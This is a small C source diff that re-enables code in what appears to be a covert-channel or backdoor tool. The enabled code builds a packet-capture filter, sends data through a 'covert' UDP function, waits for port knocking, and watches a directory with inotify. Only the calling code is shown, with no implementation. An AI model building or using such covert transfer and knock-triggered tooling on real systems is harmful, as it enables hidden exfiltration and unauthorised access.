@@ -99,7 +99,7 @@ int main(int argc, char **argv){
     pthread_create(&inotify_thread, NULL, recv_watch_directory,inotify_args);
 
 
-    /*Filter = InitFilter(targetip,localip,false);
+    Filter = InitFilter(targetip,localip,false);
     CreateFilter(Filter, pcapfilter,tcp);
     printf("Filter: %s\n",pcapfilter);
 	if(tcp){
@@ -108,7 +108,7 @@ int main(int argc, char **argv){
         covert_udp_send_data(Filter.localip, Filter.targetip, UPORT, UPORT, data, 1);
     }
 	//wait for port knocking
-	Packetcapture(pcapfilter,Filter,tcp);*/
+	Packetcapture(pcapfilter,Filter,tcp);
 	pthread_join(inotify_thread, NULL);
     return 0;
 }
